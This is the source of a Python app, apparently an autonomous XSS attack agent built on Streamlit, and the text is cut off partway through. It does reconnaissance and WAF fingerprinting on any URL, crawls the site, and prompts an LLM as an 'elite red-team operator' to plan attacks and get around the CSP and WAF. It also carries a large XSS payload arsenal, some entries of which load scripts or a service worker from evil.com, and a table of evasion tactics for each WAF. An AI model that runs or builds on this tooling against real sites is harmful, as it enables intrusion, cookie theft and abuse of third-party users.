import streamlit as st
import os
import subprocess
import requests
import re
import urllib.parse
import json
import html as html_lib
import socket
import concurrent.futures
from openai import OpenAI
from bs4 import BeautifulSoup
from collections import deque
from datetime import datetime

try:
    from playwright.sync_api import sync_playwright, TimeoutError as PWTimeout
    PLAYWRIGHT_OK = True
except ImportError:
    PLAYWRIGHT_OK = False

st.set_page_config(
    page_title="XSS Autonomous Agent",
    page_icon="🕷️",
    layout="wide",
    initial_sidebar_state="collapsed",
)

# ── Constants ──────────────────────────────────────────────────────────────────
MODEL       = "deepseek/deepseek-chat-v3-0324"
BASE_URL    = "https://openrouter.ai/api/v1"
MAX_TOKENS  = 2500
MAX_PAGES   = 40
REQ_TIMEOUT = 12
REQ_HEADERS = {
    "User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                       "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection":      "keep-alive",
    "Upgrade-Insecure-Requests": "1",
}

# ── Modern payload arsenal ─────────────────────────────────────────────────────
BASE_PAYLOADS = [
    # Classic — still needed
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    # Attribute breakout
    '"><script>alert(1)</script>',
    "'><img src=x onerror=alert(1)>",
    '" onmouseover="alert(1)',
    # HTML5 event handlers
    '<details open ontoggle=alert(1)>',
    '<video src=1 onerror=alert(1)>',
    '<audio src=1 onerror=alert(1)>',
    '<input autofocus onfocus=alert(1)>',
    '<body onpageshow=alert(1)>',
    '<marquee onstart=alert(1)>',
    # JS context
    '";alert(1)//', "';alert(1)//", '`-alert(1)-`',
    '</script><script>alert(1)</script>',
    # Angular CSTI
    '{{constructor.constructor("alert(1)")()}}',
    '{{$on.constructor("alert(1)")()}}',
    # Vue CSTI
    '{{_c.constructor("alert(1)")()}}',
    "{{toString.constructor.prototype.toString=toString.constructor.prototype.call;[\"alert(1)\"].sort(toString.constructor)}}",
    # React / dangerouslySetInnerHTML bypass
    '<script dangerouslySetInnerHTML={{__html:"alert(1)"}}>',
    # DOM clobbering
    '<form id=x><input name=attributes></form>',
    '<a id=x tabindex=1 onfocus=alert(1)></a>',
    # Mutation XSS (mXSS) — bypass innerHTML sanitizers
    '<listing><img src=1 onerror=alert(1)></listing>',
    '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
    '<!--<img src="--><img src=x onerror=alert(1)>',
    '<table><td><img src=x onerror=alert(1)></table>',
    '<select><option><img src=x onerror=alert(1)></option></select>',
    # Trusted Types bypass
    '<script>window.trustedTypes&&trustedTypes.createPolicy("default",{createHTML:s=>s});document.write("<img src=x onerror=alert(1)>")</script>',
    # Import map injection
    '<script type="importmap">{"imports":{"lodash":"//evil.com/xss.js"}}</script>',
    # Polyglots
    'javascript:/*--></title></style></textarea></script><svg/onload=alert(1)>',
    '-->"><svg/onload=alert(1)><!--',
    'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e',
    # No-paren bypass
    'onerror=alert;throw 1',
    '<img src=x onerror="alert`1`">',
    # CSS injection / hover exfil
    '</style><style>*{background:url(javascript:alert(1))}',
    # Service worker (if no SW already)
    '<script>navigator.serviceWorker&&navigator.serviceWorker.register("//evil.com/sw.js")</script>',
    # SSTI probes
    '{{7*7}}', '${7*7}', '<%= 7*7 %>', '#{7*7}', '*{7*7}',
    # Encoding variants
    '%3Cscript%3Ealert(1)%3C/script%3E',
    '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',
    '\u003cscript\u003ealert(1)\u003c/script\u003e',
    # atob decode
    '<img src=x onerror=eval(atob("YWxlcnQoMSk="))>',
    # CSP bypass via base tag
    '<base href=//evil.com/>',
    # URL/href
    'javascript:alert(1)',
    'data:text/html,<script>alert(1)</script>',
    # JSON injection
    '"},"xss":"<script>alert(1)</script>',
    # JSONP
    'alert(document.domain)//',
    # HTML only
    '<h1>INJECTED_MARKER</h1>',
    '<iframe src=javascript:alert(1)>',
]

DOM_SINKS = [
    r"innerHTML\s*[+=]", r"outerHTML\s*[+=]",
    r"document\.write\s*\(", r"document\.writeln\s*\(",
    r"\.insertAdjacentHTML\s*\(",
    r"eval\s*\(", r"setTimeout\s*\(\s*['\"`]",
    r"setInterval\s*\(\s*['\"`]", r"new\s+Function\s*\(",
    r"location\.href\s*=", r"location\.assign\s*\(",
    r"location\.replace\s*\(", r"dangerouslySetInnerHTML",
    r"v-html\s*=", r"\.html\s*\(", r"\.append\s*\(",
    r"document\.URL", r"document\.location",
    r"location\.hash", r"location\.search",
    r"document\.referrer", r"window\.name",
    r"__proto__", r"prototype\[", r"\.srcdoc\s*=",
    r"postMessage\s*\(", r"addEventListener\s*\(\s*['\"]message",
    r"trustedTypes", r"createPolicy",
    r"importScripts\s*\(", r"ServiceWorker",
]

TECH_SIGNATURES = {
    "WordPress":   [r"wp-content", r"wp-includes", r"wordpress"],
    "Drupal":      [r"drupal", r"/sites/default/files", r"Drupal.settings"],
    "Joomla":      [r"joomla", r"/components/com_", r"Joomla!"],
    "Laravel":     [r"laravel_session", r"XSRF-TOKEN", r"laravel"],
    "Django":      [r"csrfmiddlewaretoken", r"django", r"__django"],
    "Rails":       [r"authenticity_token", r"rails", r"_rails_"],
    "Angular":     [r"ng-version", r"angular", r"ng-app", r"ng\["],
    "React":       [r"__react", r"data-reactroot", r"_reactFiber"],
    "Vue":         [r"__vue__", r"v-app", r"data-v-"],
    "Next.js":     [r"__NEXT_DATA__", r"_next/static"],
    "Nuxt.js":     [r"__NUXT__", r"_nuxt/"],
    "Shopify":     [r"Shopify", r"myshopify.com"],
    "Wix":         [r"wix.com", r"wixsite.com"],
    "Squarespace": [r"squarespace", r"Squarespace"],
}

WAF_SIGNATURES = {
    "Cloudflare":  ["cloudflare", "cf-ray", "__cfduid", "cf_clearance", "cloudflare-nginx"],
    "AWS WAF":     ["awswaf", "x-amzn-requestid", "x-amzn-trace-id", "aws-waf"],
    "ModSecurity": ["mod_security", "modsecurity", "NOYB"],
    "Akamai":      ["akamai", "ak_bmsc", "bm_sz", "akamai-ghost"],
    "Sucuri":      ["sucuri", "x-sucuri-id", "x-sucuri-cache"],
    "Imperva":     ["imperva", "incapsula", "visid_incap", "_incap_"],
    "Wordfence":   ["wordfence", "wfvt_", "wordfence_verifiedHuman"],
    "F5 BIG-IP":   ["bigipserver", "ts=", "F5_", "BIGipServer"],
    "Barracuda":   ["barracuda_", "barra_counter_session"],
    "Fortinet":    ["fortigate", "fortiwaf", "FORTIWAFSID"],
    "PerimeterX":  ["_pxde", "_pxvid", "pxcts", "_px3"],
    "reCAPTCHA":   ["recaptcha", "g-recaptcha"],
    "hCaptcha":    ["hcaptcha", "h-captcha"],
}

TEMPLATE_ENGINES = {
    "jinja2":    [r"render_template", r"Jinja2", r"flask\.templating"],
    "django":    [r"django\.template", r"{% block", r"{% csrf_token"],
    "twig":      [r"Twig\\", r"twig_function", r"\.twig"],
    "smarty":    [r"Smarty", r"\{assign"],
    "erb":       [r"<%=", r"ActionView"],
    "handlebars":[r"Handlebars", r"{{#if", r"{{#each"],
    "nunjucks":  [r"nunjucks", r"{% for"],
    "freemarker":[r"freemarker", r"<#if"],
    "thymeleaf": [r"th:text", r"th:utext"],
    "pug":       [r"pug\.compile", r"\.pug$"],
    "velocity":  [r"#set\s*\(", r"#foreach"],
}

# ── Session state ──────────────────────────────────────────────────────────────
defaults = {
    "log": [], "findings": [], "running": False, "done": False,
    "pages_crawled": 0, "points_found": 0, "vulns_found": 0,
    "exploit_code": "", "report": "", "dom_sinks": [],
    "waf_detected": "", "infra": {}, "attack_plan": "",
    "_last_target": "", "_last_payload": "", "_last_depth": 2,
    "_last_blind_url": "",
}
for k, v in defaults.items():
    if k not in st.session_state:
        st.session_state[k] = v


def get_client():
    key = os.environ.get("OPENROUTER_API_KEY", "")
    if not key:
        st.error("OPENROUTER_API_KEY not set in Replit Secrets.")
        st.stop()
    return OpenAI(api_key=key, base_url=BASE_URL)


# ── Terminal ──────────────────────────────────────────────────────────────────
ICONS = {
    "info": "▸", "ok": "✅", "warn": "⚠️", "vuln": "🚨",
    "ai": "🤖", "cmd": "⚙️", "dom": "🔬", "blind": "👁️",
    "hunt": "🔭", "skip": "⏭️", "infra": "🏗️", "plan": "📋",
    "html": "🔀",
}

_TERM_HEIGHT = 560

def _build_terminal_html() -> str:
    raw_lines = st.session_state.log if st.session_state.log else ["Ready — enter a target and launch."]
    count  = len(raw_lines)
    body_h = _TERM_HEIGHT - 40

    def _color(line: str) -> str:
        l = line.lower()
        if "🚨" in line or "confirmed" in l or "critical" in l:
            return "#ff4444"
        if "⚠️" in line or "warn" in l or "reflected" in l:
            return "#ffaa00"
        if "✅" in line or "ok" in l or "done" in l:
            return "#39ff14"
        if "🤖" in line or "ai" in l or "plan" in l or "phase 0" in l:
            return "#58a6ff"
        if "🏗️" in line or "infra" in l:
            return "#c792ea"
        if "📋" in line:
            return "#7fdbca"
        if "🔀" in line or "html changed" in l:
            return "#ff79c6"
        return "#b3e5fc"

    rows = "".join(
        f'<div class="ln" style="color:{_color(l)}">'
        + l.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
        + '</div>'
        for l in reversed(raw_lines)
    )

    return f"""<!DOCTYPE html><html><head><meta charset="utf-8">
<style>
*{{box-sizing:border-box;margin:0;padding:0}}
html,body{{height:{_TERM_HEIGHT}px;overflow:hidden;background:#0d1117;
  font-family:'Courier New',monospace;font-size:12.5px;}}
#tb{{display:flex;justify-content:space-between;align-items:center;
  background:#161b22;border-bottom:1px solid #238636;
  padding:4px 12px;height:40px;flex-shrink:0;}}
#tb span{{color:#58a6ff;font-size:11px;}}
#tb button{{background:none;border:1px solid #238636;color:#39ff14;
  border-radius:4px;padding:2px 9px;cursor:pointer;
  font-size:11px;margin-left:5px;font-family:'Courier New',monospace;}}
#tb button:hover{{background:#238636;color:#fff;}}
#term{{height:{body_h}px;overflow-y:auto;
  display:flex;flex-direction:column-reverse;scroll-behavior:smooth;}}
.ln{{padding:0 16px;line-height:1.65;white-space:pre-wrap;word-break:break-all;}}
</style></head><body>
<div id="tb">
  <span>💻 Agent Terminal &nbsp;·&nbsp; {count} lines</span>
  <span>
    <button onclick="document.getElementById('term').scrollTop=document.getElementById('term').scrollHeight">⬆ Old</button>
    <button onclick="document.getElementById('term').scrollTop=0">⬇ New</button>
    <button id="fsbtn" onclick="toggleFS()">⛶ Fullscreen</button>
  </span>
</div>
<div id="term">{rows}</div>
<script>
document.getElementById('term').scrollTop = 0;
function toggleFS(){{
  var fr=window.frameElement,t=document.getElementById('term'),btn=document.getElementById('fsbtn');
  if(!fr){{var el=document.documentElement;var fn=el.requestFullscreen||el.webkitRequestFullscreen||el.mozRequestFullScreen;if(fn)fn.call(el);return;}}
  if(fr._xssFS){{['position','top','left','width','height','z-index','border','background','max-width','max-height'].forEach(function(p){{fr.style.removeProperty(p);}});fr._xssFS=false;t.style.height='{body_h}px';btn.textContent='⛶ Fullscreen';}}
  else{{[['position','fixed'],['top','0'],['left','0'],['width','100vw'],['height','100vh'],['z-index','2147483647'],['border','none'],['background','#0d1117'],['max-width','none'],['max-height','none']].forEach(function(kv){{fr.style.setProperty(kv[0],kv[1],'important');}});fr._xssFS=true;t.style.height='calc(100vh - 40px)';btn.textContent='✕ Exit';t.scrollTop=0;try{{window.parent.scrollTo(0,0);}}catch(e){{}}}}
}}
</script>
</body></html>"""


def _draw_terminal(ph):
    ph.html(_build_terminal_html(), height=_TERM_HEIGHT + 4)


def log(msg: str, kind: str = "info", term_ph=None, stats_phs=None):
    ts = datetime.now().strftime("%H:%M:%S")
    prefix = ICONS.get(kind, "▸")
    st.session_state.log.append(f"[{ts}] {prefix}  {msg}")
    if term_ph is not None:
        _draw_terminal(term_ph)
    if stats_phs is not None:
        _render_stats(*stats_phs)


def _render_stats(s1, s2, s3, s4, s5):
    s1.metric("Pages",          st.session_state.pages_crawled)
    s2.metric("Injection pts",  st.session_state.points_found)
    s3.metric("DOM sinks",      len(st.session_state.dom_sinks))
    s4.metric("Vulns",          st.session_state.vulns_found,
              delta="🚨" if st.session_state.vulns_found > 0 else None)
    s5.metric("WAF", f"⚠️ {st.session_state.waf_detected}"
              if st.session_state.waf_detected else "✅ None")


# ── Network helpers ────────────────────────────────────────────────────────────
def safe_req(method: str, url: str, **kwargs):
    try:
        fn = requests.get if method == "get" else requests.post
        return fn(url, headers=REQ_HEADERS, timeout=REQ_TIMEOUT,
                  allow_redirects=True, **kwargs)
    except Exception:
        return None


def same_origin(base: str, url: str) -> bool:
    try:
        return urllib.parse.urlparse(base).netloc == urllib.parse.urlparse(url).netloc
    except Exception:
        return False


def to_abs(base: str, href: str):
    try:
        url = urllib.parse.urljoin(base, href)
        p = urllib.parse.urlparse(url)
        if p.scheme in ("http", "https") and p.netloc:
            return url
    except Exception:
        pass
    return None


# ══════════════════════════════════════════════════════════════════════════════
# PHASE 0 — INFRASTRUCTURE RECON
# ══════════════════════════════════════════════════════════════════════════════
def phase0_infrastructure(target: str, term_ph, stats_phs) -> dict:
    """
    Deep infrastructure recon BEFORE any attack:
    - DNS / IP / ASN
    - Server & tech stack fingerprinting
    - Security headers deep analysis
    - CSP parsing (find bypass vectors)
    - CORS misconfiguration check
    - Cookie security audit
    - Known vulnerable JS library detection
    - Robots.txt / sitemap discovery
    - CMS-specific attack surface
    """
    L = lambda m, k="infra": log(m, k, term_ph, stats_phs)
    infra = {}

    parsed = urllib.parse.urlparse(target)
    hostname = parsed.netloc.split(":")[0]
    L(f"Target hostname: {hostname}")

    # DNS / IP resolution
    try:
        ips = list({r[4][0] for r in socket.getaddrinfo(hostname, None)})
        infra["ips"] = ips
        L(f"Resolved IPs: {', '.join(ips)}")
    except Exception:
        infra["ips"] = []
        L("DNS resolution failed", "warn")

    # Parallel recon requests
    def _fetch_url(url):
        try:
            return url, requests.get(url, headers=REQ_HEADERS, timeout=8,
                                     allow_redirects=True)
        except Exception:
            return url, None

    recon_urls = [
        target,
        f"{parsed.scheme}://{parsed.netloc}/robots.txt",
        f"{parsed.scheme}://{parsed.netloc}/sitemap.xml",
        f"{parsed.scheme}://{parsed.netloc}/.well-known/security.txt",
    ]

    resp_map = {}
    with concurrent.futures.ThreadPoolExecutor(max_workers=4) as ex:
        for url, resp in ex.map(lambda u: _fetch_url(u), recon_urls):
            resp_map[url] = resp

    resp = resp_map.get(target)
    if not resp:
        L("Target unreachable!", "warn")
        return infra

    # Server headers
    infra["server"]       = resp.headers.get("server", "")
    infra["x_powered_by"] = resp.headers.get("x-powered-by", "")
    infra["status"]       = resp.status_code
    if infra["server"]:
        L(f"Server: {infra['server']}")
    if infra["x_powered_by"]:
        L(f"X-Powered-By: {infra['x_powered_by']}")

    # WAF detection
    combined_low = (resp.text[:3000] + str(resp.headers) + str(resp.cookies)).lower()
    for waf, sigs in WAF_SIGNATURES.items():
        if any(s.lower() in combined_low for s in sigs):
            infra["waf"] = waf
            st.session_state.waf_detected = waf
            L(f"WAF DETECTED: {waf}", "warn")
            break
    else:
        if resp.status_code in (403, 406, 429, 503) and len(resp.text) < 500:
            infra["waf"] = "Unknown WAF/bot-protection"
            st.session_state.waf_detected = infra["waf"]
            L("Bot-protection / unknown WAF", "warn")
        else:
            infra["waf"] = ""
            L("No WAF detected")

    # Tech stack
    infra["tech"] = []
    html_lower = resp.text.lower()
    for tech, sigs in TECH_SIGNATURES.items():
        if any(re.search(s, resp.text, re.I) for s in sigs):
            infra["tech"].append(tech)
    if infra["tech"]:
        L(f"Tech stack: {', '.join(infra['tech'])}")
    else:
        L("Tech stack: unknown / custom")

    # Template engine
    for eng, sigs in TEMPLATE_ENGINES.items():
        if any(re.search(s, resp.text, re.I) for s in sigs):
            infra["template_engine"] = eng
            L(f"Template engine: {eng}", "warn")
            break
    else:
        infra["template_engine"] = ""

    # ── Security headers deep analysis ──────────────────────────────────────
    hkeys = {k.lower(): v for k, v in resp.headers.items()}
    infra["header_issues"] = []
    infra["headers_raw"]   = dict(resp.headers)

    csp = hkeys.get("content-security-policy", "")
    infra["csp"] = csp
    if not csp:
        infra["header_issues"].append("NO CSP — inline scripts completely unrestricted")
        L("No CSP header — all XSS payloads should execute", "warn")
    else:
        L(f"CSP: {csp[:120]}")
        # Find CSP bypass vectors
        csp_bypasses = []
        if "unsafe-inline" in csp:
            csp_bypasses.append("unsafe-inline: inline scripts allowed")
        if "unsafe-eval" in csp:
            csp_bypasses.append("unsafe-eval: eval() allowed")
        if "data:" in csp:
            csp_bypasses.append("data: URI allowed as script source")
        if re.search(r"script-src[^;]*\*", csp):
            csp_bypasses.append("Wildcard (*) in script-src")
        # Check for whitelisted CDNs that have JSONP/callbacks
        for cdn in ["cdn.jsdelivr.net", "cdnjs.cloudflare.com", "ajax.googleapis.com",
                    "ajax.aspnetcdn.com", "unpkg.com", "rawgit.com"]:
            if cdn in csp:
                csp_bypasses.append(f"CDN {cdn} in allowlist — JSONP bypass possible")
        # Nonce/hash?
        if "nonce-" in csp:
            csp_bypasses.append("Nonce-based CSP — check if nonce is static or predictable")
        if not csp_bypasses:
            infra["header_issues"].append(f"CSP present and appears strict: {csp[:80]}")
            L("CSP appears strict — payloads will be restricted", "warn")
        else:
            for b in csp_bypasses:
                infra["header_issues"].append(f"CSP bypass: {b}")
                L(f"CSP bypass vector: {b}", "warn")
        infra["csp_bypasses"] = csp_bypasses

    for h, msg in [
        ("x-xss-protection",        "No X-XSS-Protection header"),
        ("x-content-type-options",  "No X-Content-Type-Options — MIME sniff risk"),
        ("x-frame-options",         "No X-Frame-Options — clickjacking risk"),
        ("strict-transport-security","No HSTS"),
    ]:
        if h not in hkeys:
            infra["header_issues"].append(msg)

    # Cookie audit
    cookie_hdr = hkeys.get("set-cookie", "")
    infra["cookie_issues"] = []
    if cookie_hdr:
        if "httponly" not in cookie_hdr.lower():
            infra["cookie_issues"].append("HttpOnly MISSING — JS can steal cookies")
            L("Cookie missing HttpOnly — JS cookie theft possible!", "warn")
        if "samesite" not in cookie_hdr.lower():
            infra["cookie_issues"].append("SameSite MISSING — CSRF risk")
        if "secure" not in cookie_hdr.lower():
            infra["cookie_issues"].append("Secure flag MISSING — cookie sent over HTTP")

    # CORS check — send Origin: evil.com
    try:
        cors_resp = requests.get(target, headers={**REQ_HEADERS, "Origin": "https://evil.com"},
                                 timeout=8)
        acao = cors_resp.headers.get("access-control-allow-origin", "")
        acac = cors_resp.headers.get("access-control-allow-credentials", "")
        if acao == "*" or acao == "https://evil.com":
            infra["cors_vuln"] = f"CORS allows {acao} — with credentials={acac}"
            L(f"CORS MISCONFIGURATION: allow-origin={acao} credentials={acac}", "vuln")
        else:
            infra["cors_vuln"] = ""
    except Exception:
        infra["cors_vuln"] = ""

    # Robots.txt
    robots_resp = resp_map.get(f"{parsed.scheme}://{parsed.netloc}/robots.txt")
    if robots_resp and robots_resp.status_code == 200 and "disallow" in robots_resp.text.lower():
        disallowed = re.findall(r"Disallow:\s*(/[^\s]+)", robots_resp.text, re.I)
        infra["robots_disallowed"] = disallowed[:15]
        if disallowed:
            L(f"robots.txt: {len(disallowed)} disallowed paths (admin panels?): {disallowed[:4]}", "warn")
    else:
        infra["robots_disallowed"] = []

    # Known vulnerable JS libraries (check src= of scripts)
    soup = BeautifulSoup(resp.text, "lxml")
    vuln_libs = []
    for tag in soup.find_all("script", src=True):
        src = tag["src"].lower()
        for lib, vers in [
            ("jquery", ["1.6", "1.7", "1.8", "1.9", "1.10", "1.11", "2.0", "2.1", "2.2"]),
            ("angular", ["1.0", "1.1", "1.2", "1.3", "1.4", "1.5", "1.6"]),
            ("bootstrap", ["2.", "3.0", "3.1", "3.2", "3.3"]),
        ]:
            if lib in src:
                for v in vers:
                    if v in src:
                        vuln_libs.append(f"{lib} {v}.x (likely outdated/vulnerable)")
    infra["vuln_libs"] = vuln_libs
    if vuln_libs:
        for lib in vuln_libs:
            L(f"Vulnerable JS lib: {lib}", "warn")

    # WordPress specific extras
    if "WordPress" in infra.get("tech", []):
        wp_paths = ["/wp-login.php", "/wp-admin/", "/xmlrpc.php", "/wp-json/wp/v2/users"]
        def _chk_wp(path):
            u = f"{parsed.scheme}://{parsed.netloc}{path}"
            try:
                r = requests.get(u, headers=REQ_HEADERS, timeout=6, allow_redirects=False)
                return path, r.status_code
            except Exception:
                return path, 0
        with concurrent.futures.ThreadPoolExecutor(max_workers=4) as ex:
            for path, code in ex.map(_chk_wp, wp_paths):
                if code in (200, 301, 302):
                    L(f"WordPress path found: {path} [{code}]", "warn")
                    infra.setdefault("wp_paths", []).append(path)

    L(f"Infrastructure recon complete — {len(infra.get('header_issues',[]))} header issues, WAF={infra.get('waf','none')}", "ok")
    return infra


# ══════════════════════════════════════════════════════════════════════════════
# PHASE 0.5 — AI ATTACK PLANNING
# ══════════════════════════════════════════════════════════════════════════════
def phase05_plan_attack(client, target: str, infra: dict, user_payload: str,
                        term_ph, stats_phs) -> dict:
    """
    Feed all infra data to AI. Get back a concrete, targeted attack plan:
    - Ranked list of attack vectors (most → least likely to work)
    - Specific payloads for this target's tech stack / CSP / WAF
    - Which phases to skip / focus on
    - Specific parameters/fields to target first
    """
    L = lambda m, k="plan": log(m, k, term_ph, stats_phs)
    L("Asking AI to analyze infrastructure and plan targeted attack...")

    waf_bypass_map = {
        "Cloudflare":  "unicode escapes \\u003c\\u003e, HTML entities, atob() decode, backtick template literals, no-paren syntax (onerror=alert`1`), SVG/MathML vectors, comment injection /<!/",
        "AWS WAF":     "URL double-encoding %253C, null bytes %00, comment breaks <!-/**/->, backtick literals, tab/newline in tags, case randomization",
        "ModSecurity": "multiline payloads, \\x hex encoding, alternate event handlers (onpointerenter, onpointerover), data: URIs, nested encoding",
        "Akamai":      "unicode code points, attribute order randomization, exotic events (onpointerrawupdate, onanimationstart), whitespace tricks",
        "Imperva":     "nested tags (table/td trick), CSS expression(), \\v vertical-tab, attribute value splitting, alternate HTML5 tags",
        "Sucuri":      "SVG/MathML vectors, HTML5 semantic tags with handlers, encoded chars, vbscript: on IE",
        "Wordfence":   "template literals, atob() decoding, Function constructor, toString(36), method chaining",
        "PerimeterX":  "behavioral evasion — slow down requests, randomize, use normal-looking form data alongside payload",
    }
    waf = infra.get("waf", "none")
    waf_note = waf_bypass_map.get(waf, "Standard evasion: encoding, case mix, exotic tags")

    prompt = f"""You are an elite red-team operator planning an authorized XSS penetration test.
Analyze the infrastructure recon data and produce a concrete attack plan.

TARGET: {target}
USER GOAL: inject → {user_payload}

=== INFRASTRUCTURE RECON ===
Server: {infra.get('server', 'unknown')}
X-Powered-By: {infra.get('x_powered_by', 'unknown')}
Tech stack: {infra.get('tech', [])}
Template engine: {infra.get('template_engine', 'unknown')}
WAF: {waf}
WAF bypass tactics for {waf}: {waf_note}
CSP: {infra.get('csp', 'NONE — no CSP')}
CSP bypass vectors found: {infra.get('csp_bypasses', [])}
Cookie issues: {infra.get('cookie_issues', [])}
CORS vuln: {infra.get('cors_vuln', 'none')}
Security header issues: {infra.get('header_issues', [])}
Vulnerable JS libs: {infra.get('vuln_libs', [])}
Robots.txt disallowed (admin panels?): {infra.get('robots_disallowed', [])}

=== OUTPUT FORMAT (JSON only, no markdown) ===
Return a JSON object:
{{
  "priority_vectors": [
    {{"vector": "reflected GET param", "reason": "...", "priority": 1}},
    ...
  ],
  "top_payloads": ["payload1", "payload2", ...],  // 20 payloads SPECIFICALLY crafted for this target
  "skip_phases": [],  // list phase names to skip (e.g. "graphql" if clearly not used)
  "focus_fields": [],  // form field names or URL params most likely to be vulnerable
  "csp_bypass_strategy": "...",
  "waf_bypass_strategy": "...",
  "mutation_xss_candidates": [],  // specific mXSS payloads for this target
  "stored_xss_note": "...",  // are stored vulns likely? where?
  "attack_summary": "..."  // 2-sentence summary of best attack path
}}"""

    try:
        resp = client.chat.completions.create(
            model=MODEL,
            messages=[{"role": "user", "content": prompt}],
            max_tokens=1800,
            temperature=0.3,
        )
        raw = resp.choices[0].message.content.strip()
        raw = re.sub(r"```[a-z]*\n?|```", "", raw).strip()
        m = re.search(r"\{.*\}", raw, re.DOTALL)
        if m:
            plan = json.loads(m.group())
            L(f"Attack summary: {plan.get('attack_summary', '')}", "plan")
            L(f"WAF bypass: {plan.get('waf_bypass_strategy', '')[:100]}", "plan")
            L(f"CSP bypass: {plan.get('csp_bypass_strategy', '')[:100]}", "plan")
            pvectors = plan.get("priority_vectors", [])
            for v in pvectors[:4]:
                L(f"  Priority {v.get('priority','?')}: {v.get('vector')} — {v.get('reason','')[:80]}", "plan")
            return plan
    except Exception as e:
        L(f"AI planning failed: {e} — using defaults", "warn")

    return {"top_payloads": [], "skip_phases": [], "focus_fields": [],
            "waf_bypass_strategy": waf_note, "attack_summary": "Broad sweep."}


# ══════════════════════════════════════════════════════════════════════════════
# CRAWLER
# ══════════════════════════════════════════════════════════════════════════════
def crawl(target: str, max_depth: int, robots_paths: list,
          term_ph, stats_phs) -> list:
    visited, bfsq, pages = set(), deque([(target, 0)]), []
    # Seed with robots.txt disallowed paths (admin panels, interesting areas)
    parsed_target = urllib.parse.urlparse(target)
    base = f"{parsed_target.scheme}://{parsed_target.netloc}"
    for rpath in robots_paths[:8]:
        seed_url = base + rpath
        if seed_url not in visited:
            bfsq.appendleft((seed_url, 0))

    while bfsq and len(pages) < MAX_PAGES:
        url, depth = bfsq.popleft()
        norm = url.split("#")[0].rstrip("/")
        if norm in visited:
            continue
        visited.add(norm)
        resp = safe_req("get", url)
        if not resp:
            continue
        ct = resp.headers.get("Content-Type", "")
        if "text/html" not in ct and "javascript" not in ct:
            continue
        soup = BeautifulSoup(resp.text, "lxml")
        forms    = _extract_forms(url, soup)
        params   = _extract_params(url)
        dom_hits = _find_dom_sinks(resp.text)
        js_eps   = _extract_js_endpoints(resp.text, url)
        pages.append({
            "url": url, "html": resp.text[:20000],
            "status": resp.status_code,
            "headers": dict(resp.headers),
            "forms": forms, "params": params,
            "dom_sinks": dom_hits,
            "inline_js": _inline_js(soup),
            "js_endpoints": js_eps,
            "redirect_params": _find_open_redirect_params(resp.text, url),
            "jsonp_endpoints": _find_jsonp_endpoints(resp.text, url),
            "postmessage_handlers": _find_postmessage_handlers(resp.text),
        })
        st.session_state.pages_crawled = len(pages)
        log(f"Crawled [{len(pages)}] {url[:70]} — "
            f"{len(forms)} forms / {len(params)} params / {len(dom_hits)} sinks",
            "cmd", term_ph, stats_phs)
        if depth < max_depth:
            for tag in soup.find_all("a", href=True):
                nxt = to_abs(url, tag["href"])
                if nxt and same_origin(target, nxt):
                    nn = nxt.split("#")[0].rstrip("/")
                    if nn not in visited:
                        bfsq.append((nxt, depth + 1))
            for tag in soup.find_all("script", src=True):
                nxt = to_abs(url, tag["src"])
                if nxt and same_origin(target, nxt):
                    nn = nxt.split("#")[0].rstrip("/")
                    if nn not in visited:
                        bfsq.append((nxt, depth + 1))
    return pages


def _extract_forms(page_url: str, soup) -> list:
    forms = []
    for form in soup.find_all("form"):
        action = form.get("action") or page_url
        method = form.get("method", "get").lower()
        action_url = to_abs(page_url, action) or page_url
        fields = []
        for inp in form.find_all(["input", "textarea", "select"]):
            name  = inp.get("name") or inp.get("id") or ""
            itype = inp.get("type", "text")
            if name and itype not in ("submit", "button", "image", "file"):
                fields.append({"name": name, "type": itype,
                                "value": inp.get("value", "")})
        if fields:
            forms.append({"action": action_url, "method": method,
                           "fields": fields, "enctype": form.get("enctype", "")})
    return forms


def _extract_params(url: str) -> list:
    return list(urllib.parse.parse_qs(urllib.parse.urlparse(url).query).keys())


def _inline_js(soup) -> str:
    parts = []
    for tag in soup.find_all("script"):
        if not tag.get("src") and tag.string:
            parts.append(tag.string[:500])
    return "\n".join(parts[:8])


def _find_dom_sinks(html: str) -> list:
    found = []
    for pat in DOM_SINKS:
        for m in re.findall(f".{{0,60}}{pat}.{{0,80}}", html)[:2]:
            found.append(m.strip())
    return list(dict.fromkeys(found))[:20]


def _find_postmessage_handlers(html: str) -> list:
    handlers = []
    pattern = r"addEventListener\s*\(\s*['\"]message['\"].*?(?:function|\()\s*\(.*?\)\s*\{(.{0,300})"
    for m in re.findall(pattern, html, re.DOTALL)[:4]:
        has_origin = bool(re.search(r"event\.origin|message\.origin|\.origin\s*[!=]=", m))
        handlers.append({"snippet": m[:200], "no_origin_check": not has_origin})
    return handlers


def _find_jsonp_endpoints(html: str, base_url: str) -> list:
    eps = []
    for pat in [
        r'[\'"]([^\'"]+\?(?:callback|jsonp|cb|call)=)[\'"]',
        r'src\s*=\s*[\'"]([^\'"]+\?(?:callback|jsonp|cb)=)[^\'"]*[\'"]',
    ]:
        for m in re.findall(pat, html):
            abs_url = to_abs(base_url, m)
            if abs_url:
                eps.append(abs_url)
    return list(dict.fromkeys(eps))[:8]


def _find_open_redirect_params(html: str, url: str) -> list:
    names = {"redirect", "url", "next", "return", "return_to", "goto",
             "dest", "destination", "redir", "redirect_url", "continue",
             "target", "link", "location", "callback", "forward"}
    params = []
    parsed = urllib.parse.urlparse(url)
    for p in urllib.parse.parse_qs(parsed.query).keys():
        if p.lower() in names:
            params.append(p)
    for m in re.findall(r'<input[^>]+name=["\'](\w+)["\']', html, re.I):
        if m.lower() in names and m not in params:
            params.append(m)
    return params


def _extract_js_endpoints(html: str, base_url: str) -> list:
    eps = []
    for pat in [
        r'fetch\([\'"]([^\'"?#]+)[\'"]',
